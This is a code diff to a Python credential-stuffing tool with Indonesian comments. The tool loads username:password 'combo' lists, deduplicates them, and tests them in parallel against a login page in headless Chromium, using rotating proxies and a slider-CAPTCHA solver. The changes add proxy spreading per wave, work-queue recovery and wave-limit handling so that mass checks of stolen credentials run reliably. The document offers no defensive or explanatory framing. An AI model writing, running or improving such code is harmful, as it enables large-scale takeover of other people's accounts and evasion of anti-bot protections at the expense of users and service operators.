@@ -694,6 +694,7 @@ def load_done() -> set[str]:
 
 def load_combos(path: str) -> list[tuple[str, str]]:
     out = []
+    seen = set()
     if not os.path.exists(path):
         p_out(f"{R}[!] File tidak ditemukan: {path}{W}")
         sys.exit(1)
@@ -705,9 +706,13 @@ def load_combos(path: str) -> list[tuple[str, str]]:
             if ':' in ln:
                 u, p = ln.split(':', 1)
                 p = p.split('|', 1)[0]
-                out.append((u.strip(), p.strip()))
+                u, p = u.strip(), p.strip()
             else:
-                out.append((ln.strip(), ln.strip()))
+                u = p = ln.strip()
+            k = f"{u}:{p}".lower()
+            if k not in seen:
+                seen.add(k)
+                out.append((u, p))
     return out
 
 # ── Multinational Names & Combo Generator (checker.js 1:1) ───────────────────
@@ -1738,7 +1743,7 @@ WAVE_REFRESH_EVERY = 1000
 async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                      browser, dm, base_proxy_info=None, proxy_pool=None,
                      ensure_browser=None, browser_state=None, acct_retries=None,
-                     wave_limit: int = 0):
+                     wave_limit: int = 0, wave_idx: int = 0):
     """
     Worker 1/2-tab per browser context dengan Direct Vue Bridge + Aliyun slider solver.
     """
@@ -1748,7 +1753,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     page             = None
     page2            = None
     pool             = proxy_pool or ([base_proxy_info] if base_proxy_info else [])
-    pool_idx         = wid % max(len(pool), 1)
+    pool_idx         = (wid + wave_idx * 7) % max(len(pool), 1)
     cur_proxy_info   = pool[pool_idx] if pool else None
     rot_user_info    = None
     worker_epoch     = 0
@@ -1814,6 +1819,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     async def open_context_and_page(max_attempts: int = 4, rotate_ip: bool = False) -> bool:
         """Buka context baru pada sticky proxy + navigasi ke login page."""
         nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared, ctx_counted
+        if wave_limit and stats['checked'] >= wave_limit:
+            return False
         if rotate_ip:
             worker_epoch += 1
         await _close_ctx()
@@ -1824,7 +1831,12 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     await asyncio.wait_for(browser_state['gate'].wait(), timeout=25.0)
                 except Exception:
                     pass
-            elif ensure_browser and not browser_state['recycling'] and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 180:
+            elif (
+                ensure_browser
+                and not browser_state['recycling']
+                and (stats['proxy_ctx'] - browser_state['born_ctx']) >= 180
+                and (not wave_limit or stats['checked'] < wave_limit - 15)
+            ):
                 browser_state['recycling'] = True
                 browser_state['gate'].clear()
                 try:
@@ -1835,7 +1847,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 try:
                     if browser_state['active'] == 0:
                         dbg("Periodic Chromium recycle (clean memory/speed reset)...")
-                        await ensure_browser(force_relaunch=True)
+                        await ensure_browser(force_relaunch=True, stale_browser=browser)
                         did_recycle = True
                 except Exception:
                     pass
@@ -1845,6 +1857,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     browser_state['gate'].set()
 
         for attempt in range(1, max_attempts + 1):
+            if wave_limit and stats['checked'] >= wave_limit:
+                return False
             if attempt > 1:
                 worker_epoch += 1
             if pool:
@@ -2011,6 +2025,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
     async def _open_ready_ctx(max_tries: int = 3, rotate_ip: bool = False) -> bool:
         for t in range(max_tries):
+            if wave_limit and stats['checked'] >= wave_limit:
+                return False
             try:
                 if await open_context_and_page(rotate_ip=(rotate_ip or t > 0)) and await ensure_slider_cleared():
                     return True
@@ -2099,8 +2115,18 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 inflight_tabs += 1
 
                     if need_recover_gen is not None:
+                        if wave_limit and stats['checked'] >= wave_limit:
+                            combo_q.put_nowait((u, pw))
+                            combo_q.task_done()
+                            done_item = True
+                            break
                         ok_ctx = await _recover_ctx(need_recover_gen, 'rotate')
                         if not ok_ctx:
+                            if wave_limit and stats['checked'] >= wave_limit:
+                                combo_q.put_nowait((u, pw))
+                                combo_q.task_done()
+                                done_item = True
+                                break
                             raise RuntimeError(f"w{wid}_ctx_recovery_failed")
                         continue
 
@@ -2129,11 +2155,21 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                                 page2 = None
                         p2_miss += 1
                         if p2_miss > 10:
-                            # Tab 1 persistently unavailable on this context; return item & exit Tab 1 while Tab 0 continues
+                            # Tab 1 sementara bermasalah di context ini: kembalikan item & tunggu context baru (kecuali Tab 0 selesai / wave selesai)
                             combo_q.put_nowait((u, pw))
                             combo_q.task_done()
                             done_item = True
-                            return
+                            stuck_gen = ctx_gen
+                            for _ in range(30):
+                                if tab0_done or (wave_limit and stats['checked'] >= wave_limit):
+                                    return
+                                if ctx_gen != stuck_gen:
+                                    break
+                                await asyncio.sleep(0.5)
+                            p2_miss = 0
+                            if tab0_done or (wave_limit and stats['checked'] >= wave_limit):
+                                return
+                            break
                         await asyncio.sleep(0.5)
                         continue
 
@@ -2175,7 +2211,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if 'session limit' in err_low:
                             await asyncio.sleep(15.0)
                         if ensure_browser:
-                            await ensure_browser(force_relaunch=True)
+                            await ensure_browser(force_relaunch=True, stale_browser=browser)
                         raise RuntimeError(f"w{wid}_browser_license_restart")
 
                     k_id = f"{u}:{pw}"
@@ -2537,7 +2573,7 @@ async def async_main():
 
 
         # Worker wrapper: auto-restart jika worker crash sebelum queue habis / batas wave 1k.
-        async def worker_with_restart(wid: int, p_info, wave_limit: int = 0):
+        async def worker_with_restart(wid: int, p_info, wave_limit: int = 0, wave_idx: int = 0):
             MAX_CONSECUTIVE_FAILS = 10
             fail_count = 0
             acct_retries = {}
@@ -2548,7 +2584,7 @@ async def async_main():
                     await run_worker(
                         wid, queue, combo_q, cur_b, dm, p_info, live_pool,
                         ensure_browser=ensure_browser, browser_state=browser_state,
-                        acct_retries=acct_retries, wave_limit=wave_limit,
+                        acct_retries=acct_retries, wave_limit=wave_limit, wave_idx=wave_idx,
                     )
                     if combo_q.empty() or (wave_limit and stats['checked'] >= wave_limit):
                         break  # selesai wave / queue habis
@@ -2588,22 +2624,20 @@ async def async_main():
                 tasks = []
                 for i in range(num_workers):
                     p_info = proxy_assignments[(i + wave_idx) % NUM_CONTEXTS] if PROXY_ENABLED else None
-                    tasks.append(asyncio.create_task(worker_with_restart(i, p_info, wave_limit=wave_limit)))
+                    tasks.append(asyncio.create_task(worker_with_restart(i, p_info, wave_limit=wave_limit, wave_idx=wave_idx)))
 
                 await asyncio.gather(*tasks)
 
                 if combo_q.empty() or stats['checked'] < wave_limit:
                     break
 
-                # ponytail: full clean wave restart every 1k accounts prevents long-run Chromium slowdown
+                # ponytail: full clean wave restart every 1k accounts; keep _STATIC_CACHE and _TUNNEL_BLACKLIST
                 wave_idx += 1
                 stats['status'] = 'REFRESH'
                 if _TUI_ACTIVE:
                     render_dashboard(force=True)
                 else:
                     p_out(f"\n{c(CYAN)}[*] Refresh penuh wave #{wave_idx} ({stats['checked']:,} akun): restart semua worker & Chromium...{W}")
-                _STATIC_CACHE.clear()
-                _TUNNEL_BLACKLIST.clear()
                 gc.collect()
                 await ensure_browser(force_relaunch=True, stale_browser=browser_ref[0])
                 browser_state['born_ctx'] = stats['proxy_ctx']
